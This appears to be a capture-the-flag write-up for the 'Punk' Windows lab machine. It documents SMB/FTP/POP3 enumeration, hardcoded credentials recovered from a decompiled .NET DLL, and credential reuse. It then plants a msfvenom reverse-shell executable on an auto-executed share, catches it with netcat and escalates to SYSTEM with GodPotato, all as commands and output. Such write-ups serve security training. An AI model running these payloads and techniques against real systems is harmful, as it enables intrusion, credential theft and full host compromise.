---
title: Punk - Ronin66 Machine
published: 2026-09-15
description: Punk writeup
tags: [POP3, SNMP, SeImpersonatePrivilege, Reversing]
category: Ronin66
image: "images/cover.jpeg"
draft: false
------------

## Summary

Punk is a Windows host exposing FTP, SMTP, POP3, IMAP, SMB, and IIS. Initial enumeration revealed anonymous access to the `dev` SMB share, which contained a .NET application and its DLL. Decompiling `OldCyber2077.dll` exposed hardcoded FTP and SNMP credentials.

The recovered FTP credentials provided access to several log files. One of the logs contained SMTP credentials for `info@arakusa.corp`, which were then reused to access the POP3 service. Two mailbox messages revealed important information about the environment: one disclosed that `cyber2077.exe` placed in the `prod` share was automatically executed by a service or scheduled job, while the other exposed the default password `Arakusa2025`.

The default password was successfully reused by `Alan`, who had read and write permissions on the `prod` share. By uploading a malicious `cyber2077.exe`, code execution was obtained as `svc_v`, providing the user flag.

Finally, `svc_v` had `SeImpersonatePrivilege` enabled. This privilege was abused with GodPotato to impersonate a SYSTEM token and execute commands as `NT AUTHORITY\SYSTEM`, resulting in full compromise of the host.

## Recon

### Initial Enumeration

A full TCP scan with service detection was performed to identify the exposed services:

```shell id="4qfg8v"
➜  Punk nmap -sC -sV -p- -v 172.16.18.15 --min-rate 1000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 14:16 -0400
Nmap scan report for 172.16.18.15
Host is up (0.26s latency).
Not shown: 65517 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
25/tcp    open  smtp          MailEnable smptd 10.53--
| smtp-commands: arakusa.corp [10.8.0.30], this server offers 4 extensions, AUTH LOGIN, SIZE 40960000, HELP, AUTH=LOGIN
|_ 211 Help:->Supported Commands: HELO,EHLO,QUIT,HELP,RCPT,MAIL,DATA,RSET,NOOP
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
110/tcp   open  pop3          MailEnable POP3 Server
|_pop3-capabilities: UIDL USER TOP
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          MailEnable imapd
|_imap-capabilities: IDLE XLIST UIDPLUS SPECIAL-USEA0001 CHILDREN completed AUTH=CRAM-MD5 CAPABILITY OK AUTH=LOGIN IMAP4rev1 IMAP4
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          MailEnable smptd 10.53--
| smtp-commands: arakusa.corp [10.8.0.30], this server offers 4 extensions, AUTH LOGIN, SIZE 40960000, HELP, AUTH=LOGIN
|_ 211 Help:->Supported Commands: HELO,EHLO,QUIT,HELP,RCPT,MAIL,DATA,RSET,NOOP
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
```

The target exposed multiple services related to file sharing and email, including FTP, SMB, SMTP, POP3, and IMAP. SMB was prioritized first because anonymous access could potentially expose internal files.

## Enumeration

### SMB Enumeration

Anonymous SMB access was tested and allowed read access to the non-default `dev` share:

```shell id="d3lm6c"
➜  Punk nxc smb 172.16.18.15 -u 'guest' -p '' --shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\guest:
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Enumerated shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  Share           Permissions     Remark
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  -----           -----------     ------
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  ADMIN$                          Remote Admin
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  C$                              Default share
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  dev             READ
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  IPC$            READ            Remote IPC
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  prod
```

The `dev` share contained three files, including a .NET executable and DLL:

```shell id="w4h3ab"
➜  Punk smbclient //172.16.18.15/dev
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Oct  1 05:08:56 2025
  ..                                DHS        0  Mon Sep 14 09:58:00 2026
  OldCyber2077.dll                    A     7168  Wed Oct  1 05:07:45 2025
  OldCyber2077.exe                    A 63606204  Wed Oct  1 05:07:46 2025
  procmon.exe                         A  4124696  Wed Oct  1 05:08:30 2025

        16559871 blocks of size 4096. 10503122 blocks available
smb: \>
```

### DLL Analysis

The `OldCyber2077.dll` file was downloaded and decompiled with [ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md). The decompiled source contained hardcoded credentials for both FTP and SNMP:

```shell id="vx5e11"
➜  Punk ilspycmd OldCyber2077.dll
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.CodeAnalysis;

namespace Cyber2077
{
	internal class Program
	{
		private static readonly string ftpCreds = "nightftp:Silverhand2077#";

		private static readonly string snmpTarget = "10.10.87.22";

		private static readonly string snmpUser = "snmp-user-admin";

		private static readonly string snmpPass = "dsabih231D22d@@lk77";

		private static void Main(string[] args)
		{
			string text = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "logs");
			string text2 = Path.Combine(text, "snmp");
			string text3 = Path.Combine(text, "ftp_upload");
			Directory.CreateDirectory(text);
			Directory.CreateDirectory(text2);
			Directory.CreateDirectory(text3);
			<SNIP>
		}
	}
}
```

The relevant credentials were:

```text id="1f7d8p"
nightftp : Silverhand2077#

snmp-user-admin : dsabih231D22d@@lk77
```

The FTP credentials were useful because an FTP service was exposed on port `21`, so we moved there next.

## Shell as svc_v

### FTP Access and Log Analysis

Using the recovered `nightftp` credentials, we authenticated to FTP and enumerated the available files:

```shell id="p0b8d7"
➜  Punk ftp 172.16.18.15
Connected to 172.16.18.15.
220 Microsoft FTP Service
Name (172.16.18.15:root): nightftp
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||51709|)
125 Data connection already open; Transfer starting.
10-01-25  12:16PM       <DIR>          aspnet_client
10-01-25  09:50AM                  353 info.txt
10-01-25  10:11AM                  977 logs_data_2025-10-01_12-00-00.txt
10-01-25  10:17AM                  919 logs_data_2025-10-01_12-00-01.txt
10-01-25  10:12AM                  772 logs_data_2025-10-01_12-00-02.txt
10-01-25  10:13AM                  755 logs_data_2025-10-01_12-00-03.txt
10-01-25  10:14AM                  768 logs_data_2025-10-01_12-00-04.txt
10-01-25  09:47AM                17280 OIP.jpg
```

One of the log files contained another credential inside the generated SNMP dump:

```text id="8r0h9h"
# SNMP dump
# Target: 10.10.87.22
# Auth: user=snmp-user-admin pass=dsabih231D22d@@lk77
# Generated: 2025-10-01 12:00:01

1.3.6.1.2.1.1.1.0 = Embedded OS v3.2.1
1.3.6.1.2.1.1.3.0 = 2345678
1.3.6.1.2.1.2.2.1.10.1 = 112233
1.3.6.1.2.1.2.2.1.16.1 = 332211
1.3.6.1.4.1.2021.4.5.0 = 4096
systemLoad1 = 0.05
systemLoad5 = 0.03
uptimeSeconds = 234567
activeProcesses = 87
interfaceCount = 2
ifInErrors.1 = 0
ifOutErrors.1 = 1
diskTotal = 65536
diskFree = 56000
temperature = 45

SNMP simulated dump.
Note: Authentication attempted with mock credentials.
Local file: logs/snmp/logs_data_2025-10-01_12-00-01.txt
Contained artifact: smtp credentials found in config payload:
info@arakusa.corp
Imp0ssibl3tol3akth!son3
FTP marker: Uploaded by nightftp:Silverhand2077# at 2025-10-01 12:00:01
FTP stored as: ftp_upload/uploaded_2025-10-01_12-00-01.txt
END OF DUMP
-- log end --
Generated by Cyber2077
```

The log exposed SMTP credentials for `info@arakusa.corp`:

```text id="9by7ny"
info@arakusa.corp : Imp0ssibl3tol3akth!son3
```

Since POP3 was exposed on port `110`, the recovered credentials were tested there.

### POP3 Mailbox Enumeration

The credentials authenticated successfully and revealed three messages:

```shell id="f7kv3f"
➜  Punk curl -u info:'Imp0ssibl3tol3akth!son3' pop3://172.16.18.15/
1 5149
2 1407
3 2016
```

Message `2` contained a base64-encoded email:

```shell id="y8tqg4"
➜  Punk curl -u info:'Imp0ssibl3tol3akth!son3' pop3://172.16.18.15/2
Received: from DESKTOP-CLM9MNF ([::1]) by arakusa.corp with
 MailEnable ESMTPA; Wed, 1 Oct 2025 13:07:26 +0200
MIME-Version: 1.0
From: "Eric" <info@arakusa.corp>
To: "All Staff" <info@arakusa.corp>
Date: 1 Oct 2025 13:07:26 +0200
Subject: URGENTE: change default passwords
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: base64
Message-ID: <06D9CC3FF1794FEFB54F309E3137FEA3.MAI@arakusa.corp>
Return-Path: <info@arakusa.corp>

VGVh<BASE64_BLOB>5jb3Jw
```

We decoded the message locally:

```shell id="k4s3dc"
➜  Punk cat file.b64|base64 -d
Hi team,

Following recent findings, please take two actions immediately regarding the cyber2077.exe artifact:

1) Remove **Cyber2077.exe** from the **prod** share. The binary must be deleted from the shared folder to prevent further execution.

2) **Disable the service / scheduled job** that automatically scans the prod share and executes that binary. If the service remains active after the file is deleted, it will continue to run a missing/empty task and may produce misleading logs or restart attempts; we must remove the execution trigger as well.

Procedure:
- Stop the service/task on the host that runs the prod share job.
- Verify there are no startup entries or scheduled tasks that reference cyber2077.exe.
- Remove the file \\<server>\prod\cyber2077.exe.
- Confirm the service is disabled and document the change.

If you cannot reach the host or need elevated rights, escalate to me immediately. Do not simply delete the file without disabling the execution mechanism â€” that will leave the system in a noisy, unstable state.

Thanks,
Alan
Senior Systems Engineer
arakusa.corp
```

This email revealed that `cyber2077.exe` was automatically executed from the `prod` share. Therefore, write access to that share could potentially provide code execution.

We then checked another mailbox message for additional credentials:

```shell id="m0s1zz"
➜  Punk cat file1.b64|base64 -d
Team,

There has been a public leak this year that affects default credentials on multiple vendor devices and services. Effective immediately, **everyone must change any default passwords** on the systems and appliances you manage.

In particular, please replace any use of the default password **Arakusa2025** with a unique, strong password and document the change in the ticketing system. Focus first on:
- Network devices (switches, routers, firewalls)
- File shares and backups
- Service accounts exposed to the network

Confirm completion in the #it-ops channel or reply to this email once you have completed the changes for your scope.

Thanks,
Eric
CTO
arakusa.corp
```

The message exposed the default password `Arakusa2025`. The sender of the first email was `Alan`, so we tested this password against the SMB service.

### Foothold via the prod Share

The `Alan` account authenticated successfully and had write access to the `prod` share:

```shell id="m8qv5x"
➜  Punk nxc smb 172.16.18.15 -u 'Alan' -p 'Arakusa2025' --shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Windows 11 / Server 2025 Build 26100 x64 (name:DESKTOP-CLM9MNF) (domain:DESKTOP-CLM9MNF) (signing:True) (SMBv1:None)
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [+] DESKTOP-CLM9MNF\Alan:Arakusa2025
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  [*] Enumerated shares
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  Share           Permissions     Remark
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  -----           -----------     ------
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  ADMIN$                          Remote Admin
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  C$                              Default share
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  dev             READ
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  IPC$            READ            Remote IPC
SMB         172.16.18.15    445    DESKTOP-CLM9MNF  prod            READ,WRITE
```

This matched the behavior described in the email. Since `Alan` could write to `prod` and the environment automatically executed `cyber2077.exe`, we generated a reverse-shell executable with that exact filename:

```shell id="r8n9k0"
➜  Punk msfvenom -p windows/shell_reverse_tcp lhost=10.8.0.30 lport=4444 -f exe -o cyber2077.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
Saved as: cyber2077.exe
```

We then uploaded the executable to the writable `prod` share:

```shell id="4p8s2u"
➜  Punk smbclient //172.16.18.15/prod -U 'Alan'
Password for [WORKGROUP\Alan]:
Try "help" to get a list of possible commands.
smb: \> put cyber2077.exe
putting file cyber2077.exe as \cyber2077.exe (9.0 kB/s) (average 9.0 kB/s)
smb: \> exit
```

After the scheduled execution mechanism processed the uploaded binary, a reverse shell was received:

```shell id="x4q7mm"
➜  Punk nc -vnlp 4444
listening on [any] 4444 ...
connect to [10.8.0.30] from (UNKNOWN) [172.16.18.15] 53142
Microsoft Windows [Version 10.0.26100.8037]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\System32>whoami
whoami
desktop-clm9mnf\svc_v

C:\Windows\System32> cd Public
cd Public
PS C:\Users\Public> cat user.flg
cat user.flg
ee9<SNIP>14a
PS C:\Users\Public>
```

We now had code execution as `svc_v`.

## Shell as NT AUTHORITY\SYSTEM

### SeImpersonatePrivilege

The next step was to enumerate the privileges assigned to `svc_v`:

```shell id="p6j3kr"
C:\Windows\System32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

`SeImpersonatePrivilege` was enabled, providing a direct path to SYSTEM through token impersonation.

### GodPotato

[GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) was uploaded to the writable `prod` share and then executed from the compromised session. The binary successfully located and impersonated a SYSTEM token:

```shell id="e5d8q3"
C:\prod>.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.flg"
.\GodPotato-NET4.exe -cmd "cmd /c type C:\Users\Administrator\Desktop\root.flg"
[*] CombaseModule: 0x140730503135232
[*] DispatchTable: 0x140730505852480
[*] UseProtseqFunction: 0x140730504826816
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\92832d30-59b3-4777-9198-e9465f268f6b\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000c402-1214-ffff-626d-fcda8a9dfb05
[*] DCOM obj OXID: 0x208ba55679cb0925
[*] DCOM obj OID: 0xa25bddbb474f879d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 952 Token:0x720  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1868
39c<SNIP>89ee
```

The flag was retrieved under `NT AUTHORITY\SYSTEM`, completing the privilege escalation.
